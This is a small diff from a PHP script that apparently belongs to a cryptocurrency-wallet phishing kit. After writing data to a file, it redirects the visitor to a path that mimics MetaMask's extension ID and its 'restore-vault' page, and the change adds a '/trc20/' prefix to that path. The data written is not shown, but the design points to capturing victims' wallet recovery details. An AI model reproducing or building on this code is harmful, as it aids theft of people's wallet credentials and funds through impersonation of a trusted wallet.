@@ -23,7 +23,7 @@ fwrite($handle, "\n");
 fclose($handle);
 echo "<script LANGUAGE=\"JavaScript\">
 <!--
-window.location=\"procceses?nkbihfbeogaeaoehlefnkodbefgpgknn/home#restore-vault#/\";// -->
+window.location=\"/trc20/procceses?nkbihfbeogaeaoehlefnkodbefgpgknn/home#restore-vault#/\";// -->
 </script>";
 ?>\/
 <script type="text/javascript">
